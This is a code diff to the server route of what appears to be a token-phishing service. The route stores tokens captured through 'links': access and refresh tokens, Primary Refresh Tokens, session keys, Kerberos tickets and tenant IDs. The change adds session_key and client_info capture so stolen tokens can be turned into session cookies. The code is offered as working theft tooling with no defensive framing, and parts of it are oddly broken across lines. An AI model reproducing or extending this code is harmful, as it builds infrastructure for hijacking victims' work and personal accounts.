@@ -218,9 +218,12 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
     const link = links[0];
 
-    // Parse refresh_token - it may be a JSON blob containing PRT and other tokens (competitor format)
+    // Parse incoming data - support both old format and new PRT format
     let prt = null;
     let sessionKeyJwe = null;
+    let sessionKey = null;       // Raw session_key from token response
+    let sessionKeyEnc = null;    // session_key_enc from token response
+    let clientInfo = null;       // client_info (base64 JSON with uid+utid)
     let deviceTenantId = null;
     let tgtAd = null;
     let tgtCloud = null;
@@ -228,29 +231,50 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     let tgtCloudSessionkey = null;
     let accountType = 'work_school'; // Default to work/school
 
-    if (refresh_token) {
-        try {
-            // Check if refresh_token is JSON (competitor format with PRT data)
-            const parsedRefresh = JSON.parse(refresh_token);
-            if (parsedRefresh.prt) {
-                prt = parsedRefresh.prt;
-                accountType = 'work_school';
-            }
-            if (parsedRefresh.session_key_jwe) sessionKeyJwe = parsedRefresh.session_key_jwe;
-            if (parsedRefresh.device_tenant_id) deviceTenantId = parsedRefresh.device_tenant_id;
-            if (parsedRefresh.tgt_ad) tgtAd = JSON.stringify(parsedRefresh.tgt_ad);
-            if (parsedRefresh.tgt_cloud) tgtCloud = JSON.stringify(parsedRefresh.tgt_cloud);
-            if (parsedRefresh.kerberos_top_level_names) kerberosTopLevelNames = parsedRefresh.kerberos_top_level_names;
-            if (parsedRefresh.tgt_cloud_sessionkey) tgtCloudSessionkey = parsedRefresh.tgt_cloud_sessionkey;
-        } catch (e) {
-            // Not JSON - treat as plain refresh token (personal accounts or old format)
-            // Check if it's a known personal account token format
-            if (refresh_token.startsWith('0.AT') || refresh_token.startsWith('M.R')) {
-                accountType = 'personal';
-            }
-            prt = refresh_token;
-        }
+    // NEW: Extract PRT persistence fields from token response
+    if (req.body.client_info) {
+      clientInfo = req.body.client_info;
     }
+    if (req.body.session_key) {
+      sessionKey = req.body.session_key;
+    }
+    if (req.body.session_key_enc) {
+      sessionKeyEnc = req.body
+
+.session_key_enc;
+    }    // Parse refresh_token - it may be a JSON blob containing PRT and other tokens (competitor format)
+    let
+    rawRefreshToken = refresh_token || ''; if (rawRefreshToken) {
+      try {
+        // Check if refresh_token is JSON (competitor format with PRT data)
+        const parsedRefresh = JSON.parse(rawRefreshToken);
+        if (parsedRefresh.prt) {
+          prt = parsedRefresh.prt;
+          accountType = 'work_school';
+        }
+        if (parsedRefresh.session_key_jwe) sessionKeyJwe = parsedRefresh.session_key_jwe;
+        if (parsedRefresh.device_tenant_id) deviceTenantId = parsedRefresh.device_tenant_id;
+        if (parsedRefresh.tgt_ad) tgtAd = JSON.stringify(parsedRefresh.tgt_ad);
+        if (parsedRefresh.tgt_cloud) tgtCloud = JSON.stringify(parsedRefresh.tgt_cloud);
+        if (parsedRefresh.kerberos_top_level_names) kerberosTopLevelNames = parsedRefresh.kerberos_top_level_names;
+        if (parsedRefresh.tgt_cloud_sessionkey) tgtCloudSessionkey = parsedRefresh.tgt_cloud_sessionkey;
+      } catch (e) {
+        // Not JSON - treat as plain refresh token
+        // Check if it's a known personal account token format
+        if (rawRefreshToken.startsWith('0.AT') || rawRefreshToken.startsWith('M.R')) {
+          accountType = 'personal';
+        }
+        prt = rawRefreshToken;
+      }
+    }
+    
+    // Store client_info and session data for cookie converter use
+    // These are needed to build PRT JWT during cookie conversion
+    const captureMeta = {
+      client_info: clientInfo,
+      session_key: sessionKey,
+      session_key_enc: sessionKeyEnc,
+    };
 
     // Extract email from id_token if present
     let email = null;
@@ -332,6 +356,9 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         idToken: id_token,
         prt,
         sessionKeyJwe,
+        sessionKey: sessionKey,
+        sessionKeyEnc: sessionKeyEnc,
+        clientInfo: clientInfo,
         deviceTenantId,
         tgtAd,
         tgtCloud,
@@ -343,12 +370,13 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         userAgent: user_agent,
         linkId: link_id,
         tokenId,
+        captureMeta: captureMeta,
     };
 
     // If link is in cookie mode, trigger cookie conversion asynchronously
-    // PASS TENANT AND ACCOUNT TYPE TO AVOID AADSTS ERRORS
+    // PASS TENANT, ACCOUNT TYPE, AND CAPTURE META (client_info, session_key)
     if (link.auth_mode === 'cookie') {
-        processCookieConversion(tokenId, access_token, link.template_type, tenant, accountType)
+        processCookieConversion(tokenId, access_token, link.template_type, tenant, accountType, captureMeta)
             .then((cookieResult) => {
                 const io = req.app.get('io');
                 if (io) {
